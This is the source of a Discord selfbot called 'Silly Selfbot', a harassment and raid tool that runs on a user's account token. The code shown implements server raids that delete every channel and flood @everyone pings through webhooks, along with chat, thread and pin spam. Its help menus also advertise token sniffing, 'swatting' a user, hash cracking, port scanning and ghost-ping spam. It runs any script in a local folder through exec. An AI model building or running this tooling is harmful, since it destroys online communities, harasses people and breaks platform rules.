import discord
import os
import urllib.parse
import requests
import base64
import hashlib
import json
import time
import asyncio
import threading
import websocket
import subprocess
import socket
import random
from json import dumps
from winotify import Notification, audio
from datetime import datetime
from colorama import Fore
from pystyle import Colorate, Colors, Center, Box
from discord.ext import commands

# Define key functions




def clears():
    os.system("cls") if os.name == "nt" else os.system("clear")

def title(args=None):
    os.system("title Silly Selfbot") if args == None else os.system(f"title Silly Selfbot [~] {args}")


def make_config():
    token = input("| ~ > Token: ")
    prefix = input("| ~ > prefix: ")
    ipapikey = input("| ~ > IP Api key (leave blank if you do not know): ")
    
    data = {
        "TOKEN": token,
        "PREFIX": prefix,
        "IPLOOKUP-API-KEY": ipapikey
    }

    with open('Settings/config.json', 'w') as file:
        json.dump(data, file, indent=4)


def make_theme():
    data = {
        "AUTHOR" : "Silly Selfbot",
        "EMBED-IMAGE" : "https://www.startpage.com/sp/sxpra?url=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fen%2Fthumb%2F6%2F63%2FFeels_good_man.jpg%2F1200px-Feels_good_man.jpg",
        "COLOR" : "#8191E0"
        }

    with open("Settings/theme.json", 'w') as file:
        json.dump(data, file, indent=4)


def make_giveaway_bots_settings():
    data = {
        "GiveawayBot" : {
            "name" : "GiveawayBot",
            "discrim" : "2381",
            "Application_ID" : "294882584201003009",
            "React-Mode" : {
                "Type" : "2",
                "button_data" : {
                    "component_type" : 2,
                    "custom_id" : "enter-giveaway"
                },
                "emoji_data" : {
                    "emoji" : ""
                }
            },
            "Win-Data" : "Congratulations"
        },
        "Carl-bot" : {
            "name" : "Carl-bot",
            "discrim" : "1536",
            "Application_ID" : "235148962103951360",
            "React-Mode" : {
                "Type" : "2",
                "button_data" : {
                    "component_type" : 2,
                    "custom_id" : "giveaway"
                },
                "emoji_data" : {
                    "emoji" : ""
                }
            },
            "Win-Data" : "Congratulations"
        }
    }
    with open ("Settings/giveaway_bots.json", 'w') as file:
        json.dump(data, file, indent=4)



def get_assets_names():
   first_names = "https://cdn.discordapp.com/attachments/1187718382355746816/1187718418850398329/First_names.txt?ex=6597e7f9&is=658572f9&hm=4a109460c1393be7cda3f964806d1d2bf162cfad628e307d8d23a01e3332484f&"
   last_names = "https://cdn.discordapp.com/attachments/1187718382355746816/1187718418447728710/Last_names.txt?ex=6597e7f9&is=658572f9&hm=5f8269f7d509ee9cd0c6bee4a019013181b1cd74109e94fbf06b8d2ac9faf44f&"
   r = requests.get(first_names)
   with open('assets/First_names.txt', 'wb') as file:
       file.write(r.content)
   
   r = requests.get(last_names)
   with open("assets/Last_names.txt", 'wb') as file:
       file.write(r.content)


def check_files():
    items = os.listdir()


    folders_to_check = ["Wordlists", "Settings", "Scripts", "Lyrics", "Logs", "assets"]

    for folder in folders_to_check:
        if folder not in items:
            os.mkdir(folder)

    settings_files = os.listdir("Settings")
    if "config.json" not in settings_files:
        make_config()

    if "theme.json" not in settings_files:
        make_theme()

    if "giveaway_bots.json" not in settings_files:
        make_giveaway_bots_settings()

    assets_files = os.listdir("assets")
    if "Firstnames.txt" or "Lastnames.txt" not in assets_files:
        get_assets_names()


check_files()

whitelisted_locations = []

def get_current_session(token):
    sessions = []
    url = "https://discord.com/api/v9/auth/sessions"
    headers = {
        'authorization': token,
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wKChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSkvNTIuMC4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE2LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiJkaXNjb3JkLmNvbSIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjIyOTUyNywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
    }

    r = requests.get(url, headers=headers)
    decode = r.json()
    for info in decode['user_sessions']:
        session_info = {
            'location': info['client_info']['location'],
            'last_used': info['approx_last_used_time'],
            'id_hash': info['id_hash']
        }
        sessions.append(session_info)

    most_recent_session = max(sessions, key=lambda x: x['last_used'])
    most_recent_location = most_recent_session['location']
    whitelisted_locations.append(most_recent_location)

used_locs = []


def get_check(token):
    while True:
        sessions = []
        url = "https://discord.com/api/v9/auth/sessions"
        headers = {
            'authorization': token,
            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wKChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSkvNTIuMC4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE2LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiJkaXNjb3JkLmNvbSIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjIyOTUyNywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
        }

        r = requests.get(url, headers=headers)
        decode = r.json()
        for info in decode['user_sessions']:
            session_info = {
                'location': info['client_info']['location'],
                'last_used': info['approx_last_used_time'],
                'id_hash': info['id_hash'],
                'platform': info['client_info']['os']
            }
            sessions.append(session_info)

        most_recent_session = max(sessions, key=lambda x: x['last_used'])
        most_recent_location = most_recent_session['location']
        most_recent_hash = most_recent_session['id_hash']
        most_recent_platform = most_recent_session['platform']

        if most_recent_location not in whitelisted_locations:
            if most_recent_location not in used_locs:
                print(f"""\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} New login session detected
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Session: {most_recent_location}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Hash: {most_recent_hash}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Platform: {most_recent_platform}
""")
                used_locs.append(most_recent_location)
        time.sleep(60)






def load_settings():
    with open('Settings/config.json', 'r') as f:
        config = json.load(f)
        TOKEN = config.get('TOKEN')
        PREFIX = config.get('PREFIX')
        IPAPI = config.get('IPLOOKUP-API-KEY')
        return TOKEN, PREFIX, IPAPI

def load_theme():
    with open('Settings/theme.json', 'r') as f:
        settings = json.load(f)
        AUTHOR = settings.get('AUTHOR')
        IMAGE = settings.get('EMBED-IMAGE')
        COLOR = settings.get('COLOR')
        return AUTHOR, IMAGE, COLOR

info = []

def load_give_bots():
    with open('Settings/giveaway_bots.json') as f:
        data = json.load(f)
        info.append(data) 


load_give_bots()

bot_names = []

def decode_bots():
    for bot_info in info:
        for bot_key, bot_data in bot_info.items():
            dataa = bot_data.get('name')
            bot_names.append(dataa)
decode_bots()


scripts = []
def load_scripts():
  clears()
  for file in os.listdir("Scripts"):
    if file.endswith('.py'):
      x = open(f"Scripts/{file}", 'r').read()
      x = f"{file}ΘθΘ{x}"
      scripts.append(x)  

def execute_scripts():
    for script in scripts:
        name_with_ex = script.split('ΘθΘ')[0]
        name = name_with_ex.split('.py')[0]
        code = script.split('ΘθΘ')[1]
        exec(code)
        print(f"[~] Loaded script: {name}")
    time.sleep(1)


def window_notif(appid, title, msg, doaudio=False):
    toast = Notification(app_id=appid, title=title, msg=msg)
    if doaudio != False:
        toast.set_audio(audio.Default, loop=False)
    toast.show()


def getfriends():
    url = "https://discord.com/api/v9/users/@me/relationships"
    r = requests.get(url, headers=global_headers)
    decode = r.json()
    friends = [user for user in decode if user.get('type') == 1]
    pending = [user for user in decode if user.get('type') == 4]
    blocked = [user for user in decode if user.get('type') == 2]
    toreturn = f"{Fore.GREEN}{len(friends)}{Fore.RESET}/{Fore.YELLOW}{len(pending)}{Fore.RESET}/{Fore.RED}{len(blocked)}{Fore.RESET}"
    return toreturn

def get_commands_count():
    commandscount = 0
    with open('main.py', 'r', encoding='utf-8') as f:
        lines = f.read().splitlines()
        for line in lines:
            if "async def " in line:
                if "on_command_error" not in line:
                    if "ctx" in line:
                        commandscount += 1
    return commandscount


def givejoiner(message):
    with open('Settings/giveaway_bots.json') as f:
        configdata = json.load(f)
        application_id = configdata[message.author.name]['Application_ID']
        component_type = configdata[message.author.name]['React-Mode']['button_data']['component_type']
        custom_id = configdata[message.author.name]['React-Mode']['button_data']['custom_id']
        emoji = configdata[message.author.name]['React-Mode']['emoji_data']['emoji']
        mode = configdata[message.author.name]['React-Mode']['Type']
        winmessage = configdata[message.author.name]['Win-Data']
    if winmessage in message.content:
        if bot.user.mentioned_in(message):
            print(f"""\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Giveaway Won
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Bot: {message.author} | {application_id}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Channel: {message.guild} | {message.channel}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Successfully won at: {message.created_at.strftime('%H:%M')}""")
    else:
        if mode == "2":
            start_time = datetime.now()
            url = "https://discord.com/api/v9/interactions"
            data = {
                "type": 3,
                "guild_id": str(message.guild.id),
                "channel_id": str(message.channel.id),
                "message_id": str(message.id),
                "application_id": int(application_id),
                "session_id": bot.http.token,
                "data": {
                    "component_type": int(component_type),
                    "custom_id": str(custom_id)
                }   
            }
            r = requests.post(url, headers=global_headers, json=data)
            if r.status_code == 204:
                taken_time = datetime.now() - start_time
                print(f"""\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Giveaway detected
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Bot: {message.author} | {application_id}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Channel: {message.guild} | {message.channel}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Successfully joined in {taken_time}""")




# have to define here for embed reasons

TOKEN, PREFIX, APIIPKEY = load_settings()
AUTHOR, IMAGE, COLOR = load_theme()


def get_badges(id):
    url = f"https://discord.com/api/v9/users/{id}/profile"

    r = requests.get(url, headers={'authorization' : TOKEN})
    class Color:
        # ANSI escape code colors
        RESET = '\033[0m'
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        PURPLE = '\033[95m'
        CYAN = '\033[96m'

    badgedata = {
        'hypesquad_house_1': f'{Color.GREEN}H1{Color.RESET}',
        'hypesquad_house_2': f'{Color.GREEN}H2{Color.RESET}',
        'hypesquad_house_3': f'{Color.GREEN}H3{Color.RESET}',
        'premium': f'{Color.YELLOW}N{Color.RESET}',
        'legacy_username': f'{Color.CYAN}LU{Color.RESET}',
        'staff': f'{Color.BLUE}ST{Color.RESET}',
        'partner': f'{Color.BLUE}PT{Color.RESET}',
        'hypesquad': f'{Color.BLUE}HS{Color.RESET}',
        'bug_hunter': f'{Color.PURPLE}BH{Color.RESET}',
        'early_supporter': f'{Color.PURPLE}ES{Color.RESET}',
        'verified_bot_developer': f'{Color.PURPLE}VD{Color.RESET}',
        'bot': f'{Color.YELLOW}BT{Color.RESET}',
        'verified': f'{Color.CYAN}VR{Color.RESET}',
        'support': f'{Color.CYAN}SP{Color.RESET}',
        'events': f'{Color.CYAN}EV{Color.RESET}',
        'verified_developer': f'{Color.CYAN}VD{Color.RESET}',
        'partner_events': f'{Color.CYAN}PE{Color.RESET}',
        'system': f'{Color.CYAN}SY{Color.RESET}',
        'bug_hunter_level_2': f'{Color.CYAN}BH2{Color.RESET}',
        'early_verified_bot_developer': f'{Color.CYAN}EVD{Color.RESET}',
        'verified_bot': f'{Color.CYAN}VBT{Color.RESET}',
        'hypesquad_bravery': f'{Color.CYAN}HB{Color.RESET}',
        'hypesquad_brilliance': f'{Color.CYAN}HB{Color.RESET}',
        'hypesquad_balance': f'{Color.CYAN}HB{Color.RESET}',
        # Add more badges and their colors here
    }



    data = r.json()
    user_badges = data.get('badges') 

    user_badge_string = ""
    for badge in user_badges:
        name = badge.get('id')
        user_badge_string += f"{badgedata.get(name, 'Unknown')}/"  
    return user_badge_string






def make_embed(content, title, section, image=None):
    parsedcontent = urllib.parse.quote(content)
    parsedtitle = urllib.parse.quote(title)
    parsedauthor = urllib.parse.quote(AUTHOR)
    parsedcolor = urllib.parse.quote(COLOR)
    url = f"**[Silly Selfbot]** {section}{PIPES}https://embedl.ink/?deg&provider=&providerurl=&author={parsedauthor}&title={parsedtitle}&color={parsedcolor}&media=thumbnail&mediaurl={image}&desc={parsedcontent}"
    return url


def make_box(content, section, title):
    box = f"""```ansi
    
[2;34m[[0m [1;2m[1;35m{section}[0m[0m [2;34m][0m

[2;31m[[0m {title} [2;31m][0m
{content}```"""
    return box

# Define key variables
#d
#

SUS_WORDS = ['nighty', 'ethone', 'astolfo']
PIPES = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"
ASCII_ART = """
 ____  __  __    __    _  _    ____  ____  __    ____  ____   __  ____ 
/ ___)(  )(  )  (  )  ( \/ )  / ___)(  __)(  )  (  __)(  _ \ /  \(_  _)
\___ \ )( / (_/\/ (_/\ )  /   \___ \ ) _) / (_/\ ) _)  ) _ ((  O ) )(  
(____/(__)\____/\____/(__/    (____/(____)\____/(__)  (____/ \__/ (__) 
>---------------------------------------------------------------------<
"""

global_headers = {
    'authorization' : TOKEN,
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'sv,sv-SE;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://discord.com',
    'referer': 'https://discord.com/',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': 'sv-SE',
    'x-discord-timezone': 'Europe/Stockholm',
}    


# Setup discord shit

bot = commands.Bot(command_prefix=PREFIX, self_bot=True)
bot.remove_command("help")

def handle_warning(message):
    if "get_relationship is deprecated." in str(message):
        pass

get_current_session(TOKEN)


TOKENLOGTHREAD = threading.Thread(target=get_check, args=(TOKEN,))
TOKENLOGTHREAD.daemon = True
TOKENLOGTHREAD.start()


@bot.event
async def on_ready():
    window_notif("Silly Selfbot", "Silly Selfbot is ready", f"Logged in as: {bot.user.name}", True)
    load_scripts()
    execute_scripts()
    clears()
    title(f"Server count: {len(bot.guilds) - 2}")
    cform = getfriends()
    cmdcount = get_commands_count()
    badges = get_badges(bot.user.id)
    print(Colorate.Vertical(Colors.blue_to_purple, Center.XCenter(ASCII_ART)))
    print()
    print(f"| ~ {Fore.LIGHTBLACK_EX}${Fore.RESET} > Username: {bot.user.name}")
    print(f"| ~ {Fore.LIGHTBLACK_EX}${Fore.RESET} > Friend count: {cform}")
    print(f"| ~ {Fore.LIGHTBLACK_EX}${Fore.RESET} > Badges: {badges}")
    print(f"| ~ {Fore.LIGHTBLACK_EX}${Fore.RESET} > Loaded {cmdcount} commands")
    print(f"| ~ {Fore.LIGHTBLACK_EX}${Fore.RESET} > Run {PREFIX}HELP for help")

@bot.event
async def on_command_error(ctx, error):
    print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} {Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} A Fatal error occured {error}")

@bot.event
async def on_message_delete(message):
    if bot.user.mentioned_in(message):
        if "@everyone" not in message.content:
            if message.author != bot.user:
                print(f"""\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Ghost ping detected!!
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} User: {message.author} | {message.author.id}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Channel: {message.guild} | {message.channel}""")


@bot.event
async def on_message(message: discord.Message):
    if "discord.gift/" in message.content:
        gift_id = message.content.split('/')[-1]
        if len(gift_id) > 16:
            print(f"""\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Nitro Detected !!
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Code: discord.gift/{gift_id}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} User: {message.author} | {message.author.id}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Channel: {message.guild} | {message.channel }""")

    elif "selfbot" in message.content:
        if message.author.id != bot.user.id:
            print(f"""\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Possible selfbot user detected !!
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Offending item: {message.content}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} User: {message.author} | {message.author.id}
{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}] {Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} Channel: {message.guild} | {message.channel}""")
    
    elif message.author.name in bot_names:
        givejoiner(message)

    else:
        await bot.process_commands(message)

# >----------------<
#  Help commands
# >----------------<

@bot.command()
async def HELP(ctx):
    await ctx.message.delete()
    help_content = f"""
{PREFIX} [section] [page] ? Default is 1
>------------------------------------<
{PREFIX}raid      ? Raid commands
{PREFIX}recon     ? Recon commands
{PREFIX}cracking  ? Cracking commands
{PREFIX}utilities ? Utility commands
{PREFIX}fun       ? Fun commands
{PREFIX}troll     ? Troll commands
{PREFIX}account   ? Account commands
"""
    url = make_embed(help_content, "Help pg.1", "Help", IMAGE)
    await ctx.send(url)

@bot.command()
async def raid(ctx, page: int):
    await ctx.message.delete()
    page_1_help_content = f"""
{PREFIX}chatspam [message] [amount] ? Spam chat messages
{PREFIX}threadspam [name] [amount]  ? Spam threads
{PREFIX}spamchannels [name] [count] ? Spam channels
{PREFIX}spamroles [name] [count]    ? Spam roles
{PREFIX}pinspam [count]             ? Spam pins
{PREFIX}speedchanspam [count]       ? Spams channel very fast (BUGGY)
{PREFIX}deleteroles                 ? Delete all roles
"""
    
    page_2_help_content = f"""
{PREFIX}deletechannels                       ? Delete all channels
{PREFIX}speedchatspam [channel ID] [message] ? Spam fast
{PREFIX}webraid [message] [channel count]    ? Raid a server with hooks
{PREFIX}renamechans [name]                   ? Rename all text channels
{PREFIX}renamevc [name]                      ? Rename all voice channels
"""

    page_3_help_content = f"""
{PREFIX}renamecat [name] ? Rename all categorys
{PREFIX}eventspam [location] [name] [description] [count < 10] ? Spam events    
{PREFIX}boardspam [chanid] [count] [delay] [thread y-n] [soundid (default is duck)] ? Spam duck
    """

    if page == 1:
        url = make_embed(page_1_help_content, "Raid pg.1", "Raid", IMAGE)
    elif page == 2:
        url = make_embed(page_2_help_content, "Raid pg.2", "Raid", IMAGE)
    elif page == 3:
        url = make_embed(page_3_help_content, "Raid pg.3", 'Raid', IMAGE)
    await ctx.send(url)   


@bot.command()
async def recon(ctx, page: int):
    await ctx.message.delete()
    page_1_help_content = f"""
{PREFIX}serverinfo ? Get the current servers info
{PREFIX}whois [@user]           ? Get info on a user
"""
    if page == 1:
        url = make_embed(page_1_help_content, "Recon pg.1", "Recon", IMAGE)
    await ctx.send(url)

@bot.command()
async def cracking(ctx, page: int):
    await ctx.message.delete()
    page_1_help_content = f"""
{PREFIX}hashforce [hash] [algorithm] [wordlist] ? Crack a hash
"""
    if page == 1:
        url = make_embed(page_1_help_content, "Cracking pg.1", "Cracking", IMAGE)
    await ctx.send(url)

@bot.command()
async def utilities(ctx, page: int):
    await ctx.message.delete()
    page_1_help_content = f"""
{PREFIX}setplaying [game]       ? Set playing
{PREFIX}setstream [user] [game] ? Pretend to stream
{PREFIX}setlisten [rpc]         ? Fake listening rpc
{PREFIX}setwatch  [rpc]         ? Fake watching rpc
{PREFIX}invmake <channel ID>    ? Make an invite
{PREFIX}deleteserver            ? Delete current server
{PREFIX}restart ? Restart the selfbot
"""
    page_2_help_content = f"""
{PREFIX}portscan [ip] ? Scan an IP 
{PREFIX}iplookup [ip] ? Lookup an IP
{PREFIX}first ? Attempts to get the first message in a channel
{PREFIX}swat [number] [@target] [address] ? Swat a user
{PREFIX}clear ? Clear chat
"""
    if page == 1:
        url = make_embed(page_1_help_content, "Utilities pg.1", "Utilities", IMAGE)
    await ctx.send(url)

@bot.command()
async def fun(ctx, page: int):
    await ctx.message.delete()
    page_1_help_content = f"""
{PREFIX}sing [song file] [delay] ? Sing a song
{PREFIX}role_anim [count] [user] ? Animated roles    
{PREFIX}lyricslist               ? List all lyrics files 
{PREFIX}holtshit                 ? CAT GENERATOR                                                                      
"""
    if page == 1:
        url = make_embed(page_1_help_content, "Fun pg.1", "Fun", IMAGE)
    await ctx.send(url)

@bot.command()
async def troll(ctx, page: int):
    await ctx.message.delete()
    page_1_help_content = f"""
{PREFIX}tokensniff [@user]                ? Sniff a users token
{PREFIX}spamaddgc [userid] [count]        ? Spam add a user to a gc
{PREFIX}blockmsg [msg] [userid] [chanid]  ? Message a user you blocked
{PREFIX}vcspam [count] [channelid] ? Spam join a server VC
{PREFIX}ghostspam [count] [@user] ? Spam ghost pings
"""
    if page == 1:
        url = make_embed(page_1_help_content, "Troll pg.1", "Troll", IMAGE)
    await ctx.send(url)

@bot.command()
async def account(ctx, page: int):
    await ctx.message.delete()
    page_1_help_content = f"""
{PREFIX}changebio [content] ? Change BIO
{PREFIX}changeproniuns [new] ? Change pronouns
{PREFIX}changestatus [status] ? Change your status
"""
    if page == 1:
        url = make_embed(page_1_help_content, "Account pg.1", "Account", IMAGE)
    await ctx.send(url)

# >----------------<
#  Raid commands
# >----------------<

@bot.command()
async def chatspam(ctx, message: str, count: int):
    await ctx.message.delete()
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Started chat spamming\n")
    for i in range(count):
        await ctx.send(message)
        print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Message {message} sent | [{i+1}/{count}]")
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Finished chat spamming")

@bot.command()
async def threadspam(ctx, name:str,  count:int):
    await ctx.message.delete()
    headers = {
        'authorization' : TOKEN
    }
    data = {
        'name' : name
    }
    url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/threads"
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Started thread spamming\n")
    for i in range(count):
        r = requests.post(url, json=data, headers=headers)
        if r.status_code == 201:
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Thread made | [{i+1}/{count}]")
        else:
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Error occured | [{i+1}/{count}]")
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Finished thread spamming")


@bot.command()
async def pinspam(ctx, count: int):
    await ctx.message.delete()
    pincount = 0
    channel = bot.get_channel(ctx.channel.id)
    history = await channel.history(limit=count).flatten()
    headers = {
        'authorization' : TOKEN
    }
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Started pin spamming\n")
    for message in history:
        pincount += 1
        url = f"https://discord.com/api/v9/channels/{channel.id}/pins/{message.id}"
        r = requests.put(url, headers=headers)
        if r.status_code == 204:
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Pin made | [{pincount}/{count}]")
        else:
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Error occured | [{pincount}/{count}]")
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Finished pin spamming")

@bot.command()
async def deletechannels(ctx):
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Started deleting channels\n")
    chan_count = 0
    for channel in ctx.guild.channels:
        chan_count += 1
        try:
            await channel.delete()
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Deleted {channel} | {chan_count}")
        except Exception as e:
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Failed to delete {channel} | {chan_count}")
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Finished deleting channels")


@bot.command()
async def webraid(ctx, message: str):
    await ctx.message.delete()
    threads = []
    hooks = []
    channels_created = []
    count_tasks = 1

    for channel in ctx.guild.channels:
        await channel.delete()

    for i in range(2):
        channel = await ctx.guild.create_text_channel(f"『𝐞𝐱𝐞𝐜𝐮𝐭𝐞𝐝』")
        channels_created.append(channel)

    async def send_requests():
        delay = 0.01
        for i in range(30):
            await hook.send(f"@everyone {message}", avatar_url="https://www.startpage.com/sp/sxpra?url=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fen%2Fthumb%2F6%2F63%2FFeels_good_man.jpg%2F1200px-Feels_good_man.jpg")
            time.sleep(delay)


    for channel in channels_created:
        webhook = await channel.create_webhook(name=f"♥ Silly Selfbot ♥")
        hooks.append(webhook)

    
    for hook in hooks:
        task = asyncio.create_task(send_requests())
        threads.append(task)

    for i in range(count_tasks):
        await asyncio.gather(*threads)



@bot.command()
async def spamchannels(ctx, name: str, count: int):
    await ctx.message.delete()
